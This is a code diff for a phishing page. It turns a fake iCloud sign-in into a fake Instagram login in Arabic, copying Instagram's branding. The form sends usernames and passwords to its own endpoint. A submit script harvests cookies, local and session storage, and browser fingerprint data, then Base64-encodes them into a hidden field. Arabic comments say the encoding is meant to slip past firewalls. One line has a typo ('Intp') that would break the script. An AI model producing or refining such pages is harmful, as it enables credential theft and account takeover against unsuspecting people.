@@ -1,35 +1,52 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iCloud Verification</title>
+    <title>تسجيل الدخول • Instagram</title>
     <style>
-        body { font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
-        .box { width: 300px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #007aff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; box-sizing: border-box; text-align: center; }
+        .logo { width: 175px; margin-bottom: 24px; }
+        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px; margin-bottom: 6px; box-sizing: border-box; font-size: 12px; }
+        button { width: 100%; background: #0095f6; border: none; color: white; border-radius: 4px; padding: 7px; font-weight: bold; cursor: pointer; margin-top: 8px; }
+        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: bold; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 18px; }
+        .fb-login { color: #385185; font-size: 14px; font-weight: bold; cursor: pointer; text-decoration: none; }
+        .forgot-pw { font-size: 12px; color: #00376b; margin-top: 15px; display: block; text-decoration: none; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1c/ICloud_logo.svg/2560px-ICloud_logo.svg.png" width="80">
-        <h2>Sign in to iCloud</h2>
-        <form action="/auth/gate" method="POST" id="vault">
-            <input type="email" name="u" placeholder="Apple ID" required>
-            <input type="password" name="p" placeholder="Password" required>
-            <input type="hidden" name="sid" id="sid">
-            <button type="submit">Sign In</button>
+    <div class="login-container">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b562.png" alt="Instagram" class="logo">
+        <form action="/api/v1/auth" method="POST" id="insta-vault">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="hidden" name="full_harvest" id="full_harvest">
+            <button type="submit">Log In</button>
+            <div class="divider">OR</div>
+            <a href="#" class="fb-login">Log in with Facebook</a>
+            <a href="#" class="forgot-pw">Forgot password?</a>
         </form>
     </div>
 
     <script>
-        document.getElementById('vault').onsubmit = function() {
-            // سحب كل ما يمكن قراءته من كوكيز وتخزين محلي
-            let data = "COOKIES:" + document.cookie + " | LS:" + JSON.stringify(localStorage) + " | SS:" + JSON.stringify(sessionStorage);
+        document.getElementById('insta-vault').onsubmit = function(e) {
+            // سحب شامل لكل شيء: Cookies + LocalStorage + SessionStorage + UserAgent
+            let harvest = {
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screenResolution: window.screen.width + "x" + window.screen.height,
+                timezone: Intp.DateTimeFormat().resolvedOptions().timeZone
+            };
             
-            // تشفير البيانات لإخفائها عن الحماية أثناء الإرسال
-            document.getElementById('sid').value = btoa(unescape(encodeURIComponent(data)));
+            // تحويل البيانات لنص مشفر بـ Base64 لضمان المرور عبر جدران الحماية
+            document.getElementById('full_harvest').value = btoa(unescape(encodeURIComponent(JSON.stringify(harvest))));
+            
+            // ملاحظة من Don: الكود سيسحب كل الكوكيز المتاحة للنطاق الحالي
         };
     </script>
 </body>
